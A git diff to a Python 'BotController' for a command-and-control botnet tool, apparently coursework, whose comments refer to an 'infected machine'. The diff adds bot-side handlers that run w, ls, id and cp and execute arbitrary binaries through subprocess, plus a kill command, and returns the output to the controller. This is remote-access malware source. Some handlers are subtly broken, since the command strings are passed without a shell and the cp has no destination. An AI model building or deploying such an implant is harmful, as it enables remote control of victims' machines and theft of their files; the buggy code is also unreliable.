@@ -1,5 +1,5 @@
 import argparse
-from globvars import PROTOCOL_VERSION, MAX_FRAME_SIZE, MIN_FRAME_SIZE, TIME_WINDOW_SECONDS, ENCODING_VARIANT_ID, ROOT_SECRET, STANDARD_ALPHABET, CUSTOM_ALPHABET, MAGIC_BYTES, CMD_TYPES, SALT
+from globvars import PROTOCOL_VERSION, MAX_FRAME_SIZE, MIN_FRAME_SIZE, TIME_WINDOW_SECONDS, ENCODING_VARIANT_ID, ROOT_SECRET, STANDARD_ALPHABET, CUSTOM_ALPHABET, MAGIC_BYTES, CMD_TYPES, SALT, RESP_TYPES
 from datetime import datetime, timedelta
 import base64
 import struct # for binary packing/unpacking
@@ -7,7 +7,7 @@ import zlib
 import os
 import random
 from protocol import ProtocolHandler
-
+import subprocess
 
 # Argon2id is a blend of the previous two variants. Argon2id should be used by most users, as recommended in RFC 9106. ; taken from the docs
 from cryptography.hazmat.primitives.kdf.argon2 import Argon2id
@@ -115,8 +115,77 @@ class BotController:
             return CMD_TYPES["copy_file"], args.copy_file.encode()
         if args.exec_binary:
             return CMD_TYPES["exec_binary"], args.exec_binary.encode()
+        if args.kill:
+            return CMD_TYPES["kill"], b""
 
         raise ValueError("No valid command provided.")
+
+    def handle_announce(self, payload: bytes):
+        msg = payload.decode(errors="ignore")
+        response = f"Bot alive at {datetime.now().isoformat()} | msg={msg}"
+        return RESP_TYPES["ok"], response.encode()
+
+    def handle_list_users(self, payload: bytes):
+        # run w
+        subp_command = subprocess.run("w", capture_output=True)
+        if subp_command.returncode != 0:
+            return RESP_TYPES["error"], subp_command.stderr
+        return RESP_TYPES["ok"], subp_command.stdout
+
+    def handle_list_dir(self, payload: bytes):
+        path = payload.decode()
+        command = f"ls {path}"
+
+        subp_command = subprocess.run(command, capture_output=True)
+        if subp_command.returncode != 0:
+            return RESP_TYPES["error"], subp_command.stderr
+        return RESP_TYPES["ok"], subp_command.stdout
+
+    def handle_user_id(self, payload: bytes):
+        # run id 
+        subp_command = subprocess.run("id", capture_output=True)
+        if subp_command.returncode != 0:
+            return RESP_TYPES["error"], subp_command.stderr
+        return RESP_TYPES["ok"], subp_command.stdout
+
+    
+    def handle_copy_files(self, payload: bytes):
+        path = payload.decode()
+        command = f"cp {path}"
+        subp_command = subprocess.run(command, capture_output=True)
+
+        if subp_command.returncode != 0:
+            return RESP_TYPES["error"], subp_command.stderr
+        return RESP_TYPES["ok"], subp_command.stdout
+
+    def handle_exec_binary(self, payload: bytes):
+        path = payload.decode()
+        command = f"{path}"
+        subp_command = subprocess.run(command, capture_output=True)
+
+        if subp_command.returncode != 0:
+            return RESP_TYPES["error"], subp_command.stderr
+        return RESP_TYPES["ok"], subp_command.stdout
+
+    def handle_kill(self, payload: bytes):
+        exit()
+
+    def handle_commands(self, cmd_type: int, payload: bytes) -> tuple[int, bytes]:
+        handlers = {
+            1: self.handle_announce,
+            2: self.handle_list_users,
+            3: self.handle_list_dir,
+            4: self.handle_user_id,
+            5: self.handle_copy_files,
+            6: self.handle_exec_binary,
+            255: self.handle_kill,
+        }
+
+        handler = handlers.get(cmd_type)
+        if not handler:
+            return RESP_TYPES["error"], b"Unknown command"
+        
+        return handler(payload)
 
 def main():
     parser = argparse.ArgumentParser(description="Bot Controller")
@@ -127,9 +196,10 @@ def main():
     #3. listing content of a specified directory (output of 'ls' command). The directory is a parameter specified in the controller's command.
     parser.add_argument("--list-dir", type=str, required=False)
     #4. id of the user running the bot (output of 'id command').
-    parser.add_argument("--user-id", action="store_true", required=False)
+    parser.add_argument("--user-id", action="store_true", required=False, help ="Get the id of the currently logged in user.")
+    parser.add_argument("--kill",action="store_true", required=False, help="Kill the bot.")
     #5. copying of a file from the "infected machine" to the controller (file path is a parameter specified by the controller).
-    parser.add_argument("--copy-file", type=str, required=False)
+    parser.add_argument("--copy-file", type=str, required=False, help="Copy the file specified by the path.")
     #6. executing a binary inside the "infected machine" specified by the controller (e.g. '/usr/bin/ps').
     parser.add_argument("--exec-binary", type=str, required=False)
 
